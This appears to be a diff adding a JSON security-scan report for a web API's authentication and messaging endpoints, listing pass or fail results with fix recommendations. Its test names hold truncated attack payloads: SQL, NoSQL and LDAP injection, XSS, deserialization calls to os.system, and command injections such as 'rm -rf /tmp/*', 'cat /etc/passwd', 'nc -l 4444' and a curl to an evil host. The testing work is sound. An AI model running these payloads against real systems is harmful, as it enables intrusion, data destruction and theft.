@@ -1,0 +1,872 @@
+{
+  "timestamp": "2025-07-29T17:20:42.120490",
+  "summary": {
+    "total_tests": 58,
+    "passed_tests": 52,
+    "pass_rate": 89.65517241379311,
+    "security_score": 93.4065934065934
+  },
+  "severity_breakdown": {
+    "critical": 16,
+    "high": 40,
+    "medium": 2,
+    "low": 0
+  },
+  "detailed_results": [
+    {
+      "test_name": "SQL Injection: admin'; DROP TABLE u...",
+      "category": "Authentication",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "SQL injection should be blocked",
+      "details": "Status: 401, Response: {\"detail\":\"Incorrect username or password\"}",
+      "response_time_us": 275657.7,
+      "status_code": 401,
+      "recommendations": [
+        "Implement parameterized queries",
+        "Add input validation",
+        "Use ORM frameworks"
+      ]
+    },
+    {
+      "test_name": "SQL Injection: admin' OR '1'='1' --...",
+      "category": "Authentication",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "SQL injection should be blocked",
+      "details": "Status: 401, Response: {\"detail\":\"Incorrect username or password\"}",
+      "response_time_us": 3565.4,
+      "status_code": 401,
+      "recommendations": [
+        "Implement parameterized queries",
+        "Add input validation",
+        "Use ORM frameworks"
+      ]
+    },
+    {
+      "test_name": "SQL Injection: admin' UNION SELECT ...",
+      "category": "Authentication",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "SQL injection should be blocked",
+      "details": "Status: 401, Response: {\"detail\":\"Incorrect username or password\"}",
+      "response_time_us": 3310.0,
+      "status_code": 401,
+      "recommendations": [
+        "Implement parameterized queries",
+        "Add input validation",
+        "Use ORM frameworks"
+      ]
+    },
+    {
+      "test_name": "SQL Injection: admin'; INSERT INTO ...",
+      "category": "Authentication",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "SQL injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_too_long\",\"loc\":[\"body\",\"username\"],\"msg\":\"String should have at most 50 ",
+      "response_time_us": 1501.9,
+      "status_code": 422,
+      "recommendations": [
+        "Implement parameterized queries",
+        "Add input validation",
+        "Use ORM frameworks"
+      ]
+    },
+    {
+      "test_name": "SQL Injection: admin' AND (SELECT C...",
+      "category": "Authentication",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "SQL injection should be blocked",
+      "details": "Status: 401, Response: {\"detail\":\"Incorrect username or password\"}",
+      "response_time_us": 3401.8,
+      "status_code": 401,
+      "recommendations": [
+        "Implement parameterized queries",
+        "Add input validation",
+        "Use ORM frameworks"
+      ]
+    },
+    {
+      "test_name": "NoSQL Injection: {'username': {'$ne': None}, 'p...",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "NoSQL injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_type\",\"loc\":[\"body\",\"username\"],\"msg\":\"Input should be a valid string\",\"i",
+      "response_time_us": 912.6,
+      "status_code": 422,
+      "recommendations": [
+        "Validate input types",
+        "Sanitize NoSQL queries",
+        "Use schema validation"
+      ]
+    },
+    {
+      "test_name": "NoSQL Injection: {'username': {'$regex': '.*'},...",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "NoSQL injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_type\",\"loc\":[\"body\",\"username\"],\"msg\":\"Input should be a valid string\",\"i",
+      "response_time_us": 841.9,
+      "status_code": 422,
+      "recommendations": [
+        "Validate input types",
+        "Sanitize NoSQL queries",
+        "Use schema validation"
+      ]
+    },
+    {
+      "test_name": "NoSQL Injection: {'username': {'$where': \"this....",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "NoSQL injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_type\",\"loc\":[\"body\",\"username\"],\"msg\":\"Input should be a valid string\",\"i",
+      "response_time_us": 790.1,
+      "status_code": 422,
+      "recommendations": [
+        "Validate input types",
+        "Sanitize NoSQL queries",
+        "Use schema validation"
+      ]
+    },
+    {
+      "test_name": "NoSQL Injection: {'username': {'$gt': ''}, 'pas...",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "NoSQL injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_type\",\"loc\":[\"body\",\"username\"],\"msg\":\"Input should be a valid string\",\"i",
+      "response_time_us": 846.8,
+      "status_code": 422,
+      "recommendations": [
+        "Validate input types",
+        "Sanitize NoSQL queries",
+        "Use schema validation"
+      ]
+    },
+    {
+      "test_name": "LDAP Injection: admin)(|(password=*)...",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "LDAP injection should be blocked",
+      "details": "Status: 401, Response: {\"detail\":\"Incorrect username or password\"}",
+      "response_time_us": 3028.6,
+      "status_code": 401,
+      "recommendations": [
+        "Escape LDAP special characters",
+        "Use parameterized LDAP queries"
+      ]
+    },
+    {
+      "test_name": "LDAP Injection: admin)(&(password=*)...",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "LDAP injection should be blocked",
+      "details": "Status: 401, Response: {\"detail\":\"Incorrect username or password\"}",
+      "response_time_us": 3257.3,
+      "status_code": 401,
+      "recommendations": [
+        "Escape LDAP special characters",
+        "Use parameterized LDAP queries"
+      ]
+    },
+    {
+      "test_name": "LDAP Injection: *)(uid=*))(|(uid=*...",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "LDAP injection should be blocked",
+      "details": "Status: 401, Response: {\"detail\":\"Incorrect username or password\"}",
+      "response_time_us": 3242.4,
+      "status_code": 401,
+      "recommendations": [
+        "Escape LDAP special characters",
+        "Use parameterized LDAP queries"
+      ]
+    },
+    {
+      "test_name": "LDAP Injection: admin)(|(objectClass...",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "LDAP injection should be blocked",
+      "details": "Status: 401, Response: {\"detail\":\"Incorrect username or password\"}",
+      "response_time_us": 2956.8,
+      "status_code": 401,
+      "recommendations": [
+        "Escape LDAP special characters",
+        "Use parameterized LDAP queries"
+      ]
+    },
+    {
+      "test_name": "Timing Attack Protection",
+      "category": "Authentication",
+      "severity": "MEDIUM",
+      "passed": false,
+      "description": "Authentication timing should be consistent",
+      "details": "Valid user avg: 107685.2\u03bcs, Invalid user avg: 132784.6\u03bcs, Difference: 25099.5\u03bcs",
+      "response_time_us": 0.0,
+      "status_code": null,
+      "recommendations": [
+        "Implement constant-time comparison",
+        "Add artificial delays"
+      ]
+    },
+    {
+      "test_name": "Brute Force Protection",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": false,
+      "description": "Should protect against brute force attacks",
+      "details": "Failed attempts before rate limiting: 20, Rate limited: False",
+      "response_time_us": 0.0,
+      "status_code": null,
+      "recommendations": [
+        "Implement account lockout",
+        "Add CAPTCHA",
+        "Use progressive delays"
+      ]
+    },
+    {
+      "test_name": "Session Fixation Protection",
+      "category": "Session Management",
+      "severity": "MEDIUM",
+      "passed": false,
+      "description": "Session ID should change after login",
+      "details": "Initial cookies: 0, Post-login cookies: 0",
+      "response_time_us": 0.0,
+      "status_code": null,
+      "recommendations": [
+        "Regenerate session ID after login",
+        "Invalidate old sessions"
+      ]
+    },
+    {
+      "test_name": "JWT Validation: eyJhbGciOiJub25lIiwi...",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "Invalid JWT tokens should be rejected",
+      "details": "Status: 401",
+      "response_time_us": 0.0,
+      "status_code": 401,
+      "recommendations": [
+        "Validate JWT signature",
+        "Check token expiration",
+        "Verify token structure"
+      ]
+    },
+    {
+      "test_name": "JWT Validation: invalid.jwt.token...",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "Invalid JWT tokens should be rejected",
+      "details": "Status: 401",
+      "response_time_us": 0.0,
+      "status_code": 401,
+      "recommendations": [
+        "Validate JWT signature",
+        "Check token expiration",
+        "Verify token structure"
+      ]
+    },
+    {
+      "test_name": "JWT Validation: eyJhbGciOiJIUzI1NiIs...",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "Invalid JWT tokens should be rejected",
+      "details": "Status: 401",
+      "response_time_us": 0.0,
+      "status_code": 401,
+      "recommendations": [
+        "Validate JWT signature",
+        "Check token expiration",
+        "Verify token structure"
+      ]
+    },
+    {
+      "test_name": "JWT Validation: ...",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": false,
+      "description": "Invalid JWT tokens should be rejected",
+      "details": "Status: 403",
+      "response_time_us": 0.0,
+      "status_code": 403,
+      "recommendations": [
+        "Validate JWT signature",
+        "Check token expiration",
+        "Verify token structure"
+      ]
+    },
+    {
+      "test_name": "JWT Validation: Bearer AAAAAAAAAAAAA...",
+      "category": "Authentication",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "Invalid JWT tokens should be rejected",
+      "details": "Status: 401",
+      "response_time_us": 0.0,
+      "status_code": 401,
+      "recommendations": [
+        "Validate JWT signature",
+        "Check token expiration",
+        "Verify token structure"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <script>alert('XSS')</script>...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /auth/auth/login, Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <script>alert('XSS')</script>...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /api/v1/messages/send, Status: 404",
+      "response_time_us": 0.0,
+      "status_code": 404,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: javascript:alert('XSS')...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /auth/auth/login, Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: javascript:alert('XSS')...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /api/v1/messages/send, Status: 404",
+      "response_time_us": 0.0,
+      "status_code": 404,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <img src=x onerror=alert('XSS'...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /auth/auth/login, Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <img src=x onerror=alert('XSS'...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /api/v1/messages/send, Status: 404",
+      "response_time_us": 0.0,
+      "status_code": 404,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <svg onload=alert('XSS')>...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /auth/auth/login, Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <svg onload=alert('XSS')>...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /api/v1/messages/send, Status: 404",
+      "response_time_us": 0.0,
+      "status_code": 404,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: ';alert('XSS');//...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /auth/auth/login, Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: ';alert('XSS');//...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /api/v1/messages/send, Status: 404",
+      "response_time_us": 0.0,
+      "status_code": 404,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <iframe src=javascript:alert('...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /auth/auth/login, Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <iframe src=javascript:alert('...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /api/v1/messages/send, Status: 404",
+      "response_time_us": 0.0,
+      "status_code": 404,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <body onload=alert('XSS')>...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /auth/auth/login, Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <body onload=alert('XSS')>...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /api/v1/messages/send, Status: 404",
+      "response_time_us": 0.0,
+      "status_code": 404,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <input onfocus=alert('XSS') au...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /auth/auth/login, Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <input onfocus=alert('XSS') au...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /api/v1/messages/send, Status: 404",
+      "response_time_us": 0.0,
+      "status_code": 404,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <<SCRIPT>alert('XSS')</SCRIPT>...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /auth/auth/login, Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <<SCRIPT>alert('XSS')</SCRIPT>...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /api/v1/messages/send, Status: 404",
+      "response_time_us": 0.0,
+      "status_code": 404,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <script>eval(String.fromCharCo...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /auth/auth/login, Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XSS Filter: <script>eval(String.fromCharCo...",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XSS payloads should be filtered/escaped",
+      "details": "Endpoint: /api/v1/messages/send, Status: 404",
+      "response_time_us": 0.0,
+      "status_code": 404,
+      "recommendations": [
+        "Implement output encoding",
+        "Use CSP headers",
+        "Validate input"
+      ]
+    },
+    {
+      "test_name": "XXE Attack Protection",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": false,
+      "description": "XXE attacks should be blocked",
+      "details": "Status: 422, Response length: 265",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Disable external entity processing",
+        "Use safe XML parsers"
+      ]
+    },
+    {
+      "test_name": "XXE Attack Protection",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": false,
+      "description": "XXE attacks should be blocked",
+      "details": "Status: 422, Response length: 250",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Disable external entity processing",
+        "Use safe XML parsers"
+      ]
+    },
+    {
+      "test_name": "XXE Attack Protection",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "XXE attacks should be blocked",
+      "details": "Status: 422, Response length: 257",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Disable external entity processing",
+        "Use safe XML parsers"
+      ]
+    },
+    {
+      "test_name": "Deserialization Attack: {'__class__': 'os.system', 'args': ['rm ...",
+      "category": "Input Validation",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "Malicious deserialization should be blocked",
+      "details": "Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Avoid deserializing untrusted data",
+        "Use safe serialization formats"
+      ]
+    },
+    {
+      "test_name": "Deserialization Attack: {'__reduce__': ['os.system', ['cat /etc/...",
+      "category": "Input Validation",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "Malicious deserialization should be blocked",
+      "details": "Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Avoid deserializing untrusted data",
+        "Use safe serialization formats"
+      ]
+    },
+    {
+      "test_name": "Deserialization Attack: {'py/object': 'subprocess.Popen', 'args'...",
+      "category": "Input Validation",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "Malicious deserialization should be blocked",
+      "details": "Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Avoid deserializing untrusted data",
+        "Use safe serialization formats"
+      ]
+    },
+    {
+      "test_name": "Buffer Overflow Test 1",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "Large payload (10000 bytes) should be rejected",
+      "details": "Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement input size limits",
+        "Use proper bounds checking"
+      ]
+    },
+    {
+      "test_name": "Buffer Overflow Test 2",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "Large payload (100000 bytes) should be rejected",
+      "details": "Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement input size limits",
+        "Use proper bounds checking"
+      ]
+    },
+    {
+      "test_name": "Buffer Overflow Test 3",
+      "category": "Input Validation",
+      "severity": "HIGH",
+      "passed": true,
+      "description": "Large payload (1000000 bytes) should be rejected",
+      "details": "Status: 422",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Implement input size limits",
+        "Use proper bounds checking"
+      ]
+    },
+    {
+      "test_name": "Command Injection: ; ls -la...",
+      "category": "Input Validation",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "Command injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_too_short\",\"loc\":[\"body\",\"password\"],\"msg\":\"String should have at least 6",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Sanitize shell metacharacters",
+        "Use parameterized commands",
+        "Avoid system calls"
+      ]
+    },
+    {
+      "test_name": "Command Injection: | cat /etc/passwd...",
+      "category": "Input Validation",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "Command injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_too_short\",\"loc\":[\"body\",\"password\"],\"msg\":\"String should have at least 6",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Sanitize shell metacharacters",
+        "Use parameterized commands",
+        "Avoid system calls"
+      ]
+    },
+    {
+      "test_name": "Command Injection: && whoami...",
+      "category": "Input Validation",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "Command injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_too_short\",\"loc\":[\"body\",\"password\"],\"msg\":\"String should have at least 6",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Sanitize shell metacharacters",
+        "Use parameterized commands",
+        "Avoid system calls"
+      ]
+    },
+    {
+      "test_name": "Command Injection: `id`...",
+      "category": "Input Validation",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "Command injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_too_short\",\"loc\":[\"body\",\"password\"],\"msg\":\"String should have at least 6",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Sanitize shell metacharacters",
+        "Use parameterized commands",
+        "Avoid system calls"
+      ]
+    },
+    {
+      "test_name": "Command Injection: $(cat /etc/hosts)...",
+      "category": "Input Validation",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "Command injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_too_short\",\"loc\":[\"body\",\"password\"],\"msg\":\"String should have at least 6",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Sanitize shell metacharacters",
+        "Use parameterized commands",
+        "Avoid system calls"
+      ]
+    },
+    {
+      "test_name": "Command Injection: ; rm -rf /tmp/*...",
+      "category": "Input Validation",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "Command injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_too_short\",\"loc\":[\"body\",\"password\"],\"msg\":\"String should have at least 6",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Sanitize shell metacharacters",
+        "Use parameterized commands",
+        "Avoid system calls"
+      ]
+    },
+    {
+      "test_name": "Command Injection: | nc -l 4444...",
+      "category": "Input Validation",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "Command injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_too_short\",\"loc\":[\"body\",\"password\"],\"msg\":\"String should have at least 6",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Sanitize shell metacharacters",
+        "Use parameterized commands",
+        "Avoid system calls"
+      ]
+    },
+    {
+      "test_name": "Command Injection: && curl http://evil....",
+      "category": "Input Validation",
+      "severity": "CRITICAL",
+      "passed": true,
+      "description": "Command injection should be blocked",
+      "details": "Status: 422, Response: {\"detail\":[{\"type\":\"string_too_long\",\"loc\":[\"body\",\"username\"],\"msg\":\"String should have at most 50 ",
+      "response_time_us": 0.0,
+      "status_code": 422,
+      "recommendations": [
+        "Sanitize shell metacharacters",
+        "Use parameterized commands",
+        "Avoid system calls"
+      ]
+    }
+  ]
+}
